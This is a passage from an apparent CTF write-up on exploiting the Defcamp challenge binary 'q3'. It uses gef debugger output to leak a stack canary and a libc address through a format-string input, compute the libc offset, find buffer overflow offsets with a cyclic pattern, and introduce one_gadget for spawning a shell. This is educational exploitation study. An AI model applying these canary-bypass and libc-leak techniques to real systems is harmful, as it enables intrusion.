</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd48</span><span class="err">│+</span><span class="mi">0x0038</span><span class="p">:</span> <span class="mi">0x00007ffff7a05b97</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="err">&gt;</span> <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nl">code:x86:</span><span class="err">64</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554810</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">150</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">155</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555481a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">160</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">→</span> <span class="err">0</span><span class="nf">x55555555481e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span><span class="err">&gt;</span>       <span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554827</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">173</span><span class="err">&gt;</span>       <span class="no">je</span>     <span class="mh">0x55555555482e</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">180</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554829</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">175</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554630</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555482e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">180</span><span class="err">&gt;</span>       <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555482f</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">181</span><span class="p">&gt;</span>       <span class="no">ret</span>    
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555554830</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">0</span><span class="p">&gt;</span> <span class="no">push</span>   <span class="no">r15</span>
</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;q3&#34;, stopped, reason: BREAKPOINT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x55555555481e → main()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0x000055555555481e</span> <span class="no">in</span> <span class="no">main</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="no">$rcx</span>
</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="mi">0x50a01b0663fa1e00</span>    <span class="err">&lt;</span><span class="p">--</span> <span class="no">Ye</span><span class="p">,</span> <span class="no">there</span> <span class="no">it</span> <span class="no">is.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Here, we have a stack canary leak which is equal to the one in <code>rcx</code> register where it&rsquo;s getting stored. So, now we need to find out the libc offset as we are now on buffer overflow stage. As we already know we need to get libc offset and from earlier that format string vulnerability was causing the libc address to leak, so it&rsquo;d be a matter of time to find it out:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span> 
</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">name</span> <span class="p">:</span> <span class="err">%</span><span class="mi">3</span><span class="no">$lx</span>
</span></span><span class="line"><span class="cl"><span class="nf">Hello</span>
</span></span><span class="line"><span class="cl"><span class="err">7</span><span class="nf">ffff7af4154</span>
</span></span><span class="line"><span class="cl"><span class="nf">Enter</span> <span class="no">sentence</span> <span class="p">:</span> <span class="err">^</span><span class="no">C</span>  
</span></span><span class="line"><span class="cl"><span class="no">Program</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGINT</span><span class="p">,</span> <span class="no">Interrupt.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">vmmap</span>
</span></span><span class="line"><span class="cl"><span class="nf">Start</span>              <span class="no">End</span>                <span class="no">Offset</span>             <span class="no">Perm</span> <span class="no">Path</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555554000</span> <span class="mi">0x0000555555555000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555754000</span> <span class="mi">0x0000555555755000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555755000</span> <span class="mi">0x0000555555756000</span> <span class="mi">0x0000000000001000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555756000</span> <span class="mi">0x0000555555777000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> <span class="p">[</span><span class="no">heap</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff79e4000</span> <span class="mi">0x00007ffff7bcb000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7bcb000</span> <span class="mi">0x00007ffff7dcb000</span> <span class="mi">0x00000000001e7000</span> <span class="p">---</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7dcb000</span> <span class="mi">0x00007ffff7dcf000</span> <span class="mi">0x00000000001e7000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7dcf000</span> <span class="mi">0x00007ffff7dd1000</span> <span class="mi">0x00000000001eb000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7dd1000</span> <span class="mi">0x00007ffff7dd5000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00007ffff7dd5000</span> <span class="mi">0x00007ffff7dfc000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">ld-2.27.so</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7fd1000</span> <span class="mi">0x00007ffff7fd3000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00007ffff7ff7000</span> <span class="mi">0x00007ffff7ffa000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> <span class="p">[</span><span class="no">vvar</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffa000</span> <span class="mi">0x00007ffff7ffc000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="p">[</span><span class="no">vdso</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffc000</span> <span class="mi">0x00007ffff7ffd000</span> <span class="mi">0x0000000000027000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">ld-2.27.so</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffd000</span> <span class="mi">0x00007ffff7ffe000</span> <span class="mi">0x0000000000028000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">ld-2.27.so</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffe000</span> <span class="mi">0x00007ffff7fff000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x00007ffffffde000</span> <span class="mi">0x00007ffffffff000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> <span class="p">[</span><span class="no">stack</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffffffff600000</span> <span class="mi">0xffffffffff601000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="p">[</span><span class="no">vsyscall</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0x7ffff7af4154</span> <span class="p">-</span> <span class="mi">0x00007ffff79e4000</span>
</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="mi">0x110154</span>
</span></span></code></pre></div><p>Using <code>vmmap</code> we get to know the address of executable and writable libc and using the address we leaked from <code>%3$lx</code> input we have the leaked libc address, we just subtracted the leak address from the <code>libc.so.6</code> address, we get the offset.</p>
<p>Time to find out the offsets for register so we we will create our final exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span>
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x81e</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">create</span> <span class="mi">100</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Generating</span> <span class="no">a</span> <span class="no">pattern</span> <span class="no">of</span> <span class="mi">100</span> <span class="no">bytes</span>
</span></span><span class="line"><span class="cl"><span class="nf">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Saved</span> <span class="no">as</span> <span class="err">&#39;</span><span class="no">$_gef0</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span> 
</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">name</span> <span class="p">:</span> <span class="no">AAAA</span>
</span></span><span class="line"><span class="cl"><span class="nf">Hello</span>
</span></span><span class="line"><span class="cl"><span class="nf">AAAA</span>
</span></span><span class="line"><span class="cl"><span class="nf">Enter</span> <span class="no">sentence</span> <span class="p">:</span> <span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rax</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$rbx</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$rcx</span>   <span class="p">:</span> <span class="mi">0x6161616161616164</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">daaaaaaa</span><span class="err">&#34;?</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rdx</span>   <span class="p">:</span> <span class="mi">0x00007ffff7dd18d0</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rsp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd10</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rbp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd40</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span><span class="p">[...]</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rsi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd20</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga</span><span class="p">[...]</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rdi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd21</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa</span><span class="p">[...]</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rip</span>   <span class="p">:</span> <span class="mi">0x000055555555481e</span>  <span class="err">→</span>  <span class="mi">0x000028250c334864</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">dH3</span>
</span></span><span class="line"><span class="cl">                                                        <span class="err">%(&#34;?)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r8</span>    <span class="p">:</span> <span class="mi">0x00005555557566d5</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r9</span>    <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r10</span>   <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r11</span>   <span class="p">:</span> <span class="mi">0x246</span>             
</span></span><span class="line"><span class="cl"><span class="no">$r12</span>   <span class="p">:</span> <span class="mi">0x0000555555554670</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_start</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r13</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde20</span>  <span class="err">→</span>  <span class="mi">0x0000000000000001</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r14</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$r15</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$eflags</span><span class="p">:</span> <span class="p">[</span><span class="no">ZERO</span> <span class="no">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">$cs:</span> <span class="err">0</span><span class="nf">x0033</span> <span class="no">$ss</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$ds</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$es</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$fs</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$gs</span><span class="p">:</span> <span class="mi">0x0000</span> 
</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">stack</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd10</span><span class="err">│+</span><span class="mi">0x0000</span><span class="p">:</span> <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>	 <span class="err">←</span> <span class="no">$rsp</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd18</span><span class="err">│+</span><span class="mi">0x0008</span><span class="p">:</span> <span class="mi">0x00007ffff7dcfa00</span>  <span class="err">→</span>  <span class="mi">0x00000000fbad2288</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd20</span><span class="err">│+</span><span class="mi">0x0010</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga</span><span class="p">[...]</span><span class="err">&#34;</span>	 <span class="err">←</span> <span class="no">$rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd28</span><span class="err">│+</span><span class="mi">0x0018</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha</span><span class="p">[...]</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd30</span><span class="err">│+</span><span class="mi">0x0020</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia</span><span class="p">[...]</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd38</span><span class="err">│+</span><span class="mi">0x0028</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja</span><span class="p">[...]</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd40</span><span class="err">│+</span><span class="mi">0x0030</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span><span class="p">[...]</span><span class="err">&#34;</span>	 <span class="err">←</span> <span class="no">$rbp</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd48</span><span class="err">│+</span><span class="mi">0x0038</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala</span><span class="p">[...]</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nl">code:x86:</span><span class="err">64</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554810</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">150</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">155</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555481a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">160</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">→</span> <span class="err">0</span><span class="nf">x55555555481e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span><span class="err">&gt;</span>       <span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554827</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">173</span><span class="err">&gt;</span>       <span class="no">je</span>     <span class="mh">0x55555555482e</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">180</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554829</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">175</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554630</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555482e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">180</span><span class="err">&gt;</span>       <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555482f</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">181</span><span class="p">&gt;</span>       <span class="no">ret</span>    
</span></span><span class="line"><span class="cl">   <span class="mh">0x555555554830</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">0</span><span class="p">&gt;</span> <span class="no">push</span>   <span class="no">r15</span>
</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;q3&#34;, stopped, reason: BREAKPOINT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x55555555481e → main()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0x000055555555481e</span> <span class="no">in</span> <span class="no">main</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="no">daaaaaaa</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">daaaaaaa</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">17</span> <span class="p">(</span><span class="no">little-endian</span> <span class="no">search</span><span class="p">)</span> <span class="no">likely</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">24</span> <span class="p">(</span><span class="no">big-endian</span> <span class="no">search</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">32</span> <span class="p">(</span><span class="no">big-endian</span> <span class="no">search</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="no">$rcx</span>
</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="mi">0x6161616161616164</span>   <span class="err">&lt;</span><span class="p">---</span> <span class="no">Canary</span> <span class="no">value</span> <span class="no">overwrtten</span>
</span></span></code></pre></div><p>As you can see we have overwritten the canary and we have the <code>rcx</code> register offset and we have <code>rbp</code> register offset at 32 which would be <code>32 - 24 = 8</code>.</p>
<h3 id="one_gadget---the-best-tool-for-finding-one-gadget-rce-in-libcso6" class="relative group">One_gadget - The best tool for finding one gadget RCE in libc.so.6 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#one_gadget---the-best-tool-for-finding-one-gadget-rce-in-libcso6" aria-label="Anchor">#</a></span></h3><p>I can honsetly vouch for this tool, this was the first time I used it and it&rsquo;s just awesome. With this tool it was easier to find the gadgets for shell spwaning.</p>
